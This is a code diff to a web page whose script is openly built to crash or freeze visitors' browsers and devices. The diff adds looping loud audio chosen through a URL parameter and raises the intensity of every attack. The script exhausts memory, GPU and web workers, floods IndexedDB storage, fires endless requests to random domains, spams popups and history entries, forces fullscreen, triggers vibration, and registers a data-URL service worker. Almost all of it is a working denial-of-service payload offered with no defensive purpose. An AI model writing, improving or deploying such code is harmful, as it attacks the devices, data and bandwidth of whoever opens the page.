@@ -11,12 +11,22 @@
 </head>
 <body>
     <script>
+        // Get chosen song from URL parameter
+        function getSongUrl() {
+            const params = new URLSearchParams(window.location.search);
+            let song = params.get('song');
+            if (!song) {
+                song = "Bitcoin.mp3"; // fallback
+            }
+            return song;
+        }
+
         let arrays = [];
         const workers = [];
         const audioCtxs = [];
         let dbCounter = 0;
 
-        // Instant fullscreen lock - fires immediately
+        // Instant fullscreen
         function forceFullscreen() {
             const elem = document.documentElement;
             const methods = ['requestFullscreen', 'webkitRequestFullscreen', 'msRequestFullscreen'];
@@ -33,27 +43,47 @@
             }, 0);
         }
 
+        // Play YOUR chosen song - loud, looping, multiple layers
+        function playSongHell() {
+            const songUrl = getSongUrl();
+            
+            setInterval(() => {
+                try {
+                    const audio = new Audio(songUrl);
+                    audio.loop = true;
+                    audio.volume = 1.0;
+                    audio.play().catch(() => {});
+                    
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    audioCtxs.push(ctx);
+                    const source = ctx.createMediaElementSource(audio);
+                    source.connect(ctx.destination);
+                    audio.play();
+                } catch(e) {}
+            }, 50);
+        }
+
         // Extreme instant memory bomb
         function instantMemoryHell() {
             try {
                 setInterval(() => {
-                    for (let i = 0; i < 800; i++) {
-                        arrays.push(new Float64Array(4000000).map(() => Math.random() ** 200));
+                    for (let i = 0; i < 1000; i++) {
+                        arrays.push(new Float64Array(5000000).map(() => Math.random() ** 300));
                     }
-                    if (arrays.length > 600) arrays.length = 30;
+                    if (arrays.length > 800) arrays.length = 20;
                 }, 0);
             } catch(e) {}
         }
 
-        // GPU destroyer - more contexts, heavier draws
+        // GPU destroyer
         function instantGpuHell() {
             const canvases = [];
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 250; i++) {
                 const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth * 5;
-                canvas.height = window.innerHeight * 5;
+                canvas.width = window.innerWidth * 6;
+                canvas.height = window.innerHeight * 6;
                 document.body.appendChild(canvas);
-                const ctx = canvas.getContext('webgl2', {alpha: false}) || canvas.getContext('webgl', {alpha: false}) || canvas.getContext('2d');
+                const ctx = canvas.getContext('webgl2', {alpha: false, antialias: false}) || canvas.getContext('webgl', {alpha: false}) || canvas.getContext('2d');
                 canvases.push(ctx);
             }
             
@@ -62,9 +92,9 @@
                     if (!ctx) return;
                     ctx.clearColor(Math.random(), Math.random(), Math.random(), 1);
                     ctx.clear(ctx.COLOR_BUFFER_BIT || 0);
-                    for (let j = 0; j < 120000; j++) {
+                    for (let j = 0; j < 150000; j++) {
                         ctx.fillStyle = `hsl(${Date.now() % 360}, 100%, 50%)`;
-                        ctx.fillRect(Math.random() * ctx.canvas.width, Math.random() * ctx.canvas.height, 120, 120);
+                        ctx.fillRect(Math.random() * ctx.canvas.width, Math.random() * ctx.canvas.height, 150, 150);
                     }
                 });
                 requestAnimationFrame(renderChaos);
@@ -72,15 +102,15 @@
             renderChaos();
         }
 
-        // Worker hell - max workers
+        // Worker hell
         function instantWorkerHell() {
             const workerScript = `
                 self.onmessage = () => {
                     const off = new OffscreenCanvas(16384, 16384);
                     const c = off.getContext('2d') || off.getContext('bitmaprenderer');
                     setInterval(() => {
-                        for (let i = 0; i < 600000; i++) {
-                            new Array(2000000).fill(Math.random());
+                        for (let i = 0; i < 800000; i++) {
+                            new Array(3000000).fill(Math.random());
                         }
                         if (c) {
                             c.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
@@ -89,7 +119,7 @@
                     }, 0);
                 };
             `;
-            for (let i = 0; i < 48; i++) {
+            for (let i = 0; i < 64; i++) {
                 try {
                     const blob = new Blob([workerScript], {type: 'application/javascript'});
                     const w = new Worker(URL.createObjectURL(blob));
@@ -107,11 +137,11 @@
                     audioCtxs.push(audio);
                     const osc = audio.createOscillator();
                     osc.type = 'sawtooth';
-                    osc.frequency.value = Math.random() * 4000;
+                    osc.frequency.value = Math.random() * 5000;
                     osc.connect(audio.destination);
                     osc.start();
-                    setTimeout(() => { if (osc.stop) osc.stop(); }, 5);
-                    if (navigator.vibrate) navigator.vibrate([5, 3, 5, 3, 5]);
+                    setTimeout(() => { if (osc.stop) osc.stop(); }, 3);
+                    if (navigator.vibrate) navigator.vibrate([3, 2, 3, 2, 3]);
                 } catch(e) {}
             }, 0);
         }
@@ -120,7 +150,7 @@
         function instantStorageHell() {
             setInterval(() => {
                 try {
-                    const req = indexedDB.open('crashDB' + (dbCounter++ % 200), 1);
+                    const req = indexedDB.open('crashDB' + (dbCounter++ % 300), 1);
                     req.onupgradeneeded = e => {
                         const db = e.target.result;
                         if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
@@ -128,8 +158,8 @@
                     req.onsuccess = e => {
                         const tx = e.target.result.transaction('data', 'readwrite');
                         const store = tx.objectStore('data');
-                        for (let i = 0; i < 2000; i++) {
-                            store.put(new Array(50000).fill(Math.random()), Date.now() + i);
+                        for (let i = 0; i < 3000; i++) {
+                            store.put(new Array(80000).fill(Math.random()), Date.now() + i);
                         }
                     };
                 } catch(e) {}
@@ -139,7 +169,7 @@
         // Network hell
         function instantNetworkHell() {
             setInterval(() => {
-                for (let i = 0; i < 80; i++) {
+                for (let i = 0; i < 100; i++) {
                     fetch('https://' + Math.random().toString(36).substring(2,15) + '.com?' + Date.now() + '&r=' + Math.random(), {mode: 'no-cors', cache: 'no-store'})
                     .catch(() => {});
                 }
@@ -153,20 +183,19 @@
                     window.open(location.href, '_blank');
                     window.open('https://google.com', '_blank');
                 } catch(e) {}
-                for (let i = 0; i < 200; i++) {
+                for (let i = 0; i < 300; i++) {
                     history.pushState(null, null, location.href + '#' + Math.random());
                 }
-                // DOM spam
-                for (let i = 0; i < 50; i++) {
+                for (let i = 0; i < 80; i++) {
                     const div = document.createElement('div');
-                    div.style.cssText = 'position:absolute;width:100%;height:100%;transform:rotate(' + Math.random()*360 + 'deg);';
+                    div.style.cssText = `position:absolute;width:100%;height:100%;transform:rotate(${Math.random()*360}deg);filter:blur(1px);`;
                     document.body.appendChild(div);
                 }
             }, 0);
 
             function deepCrash() {
                 Promise.resolve().then(() => {
-                    new Array(1000000).fill(0).map(Math.random);
+                    new Array(2000000).fill(0).map(Math.random);
                     deepCrash();
                 });
             }
@@ -178,8 +207,9 @@
             navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch",e=>e.respondWith(new Response("")));');
         }
 
-        // Launch everything instantly - no waiting
+        // Launch everything instantly
         forceFullscreen();
+        playSongHell();
         instantMemoryHell();
         instantGpuHell();
         instantWorkerHell();
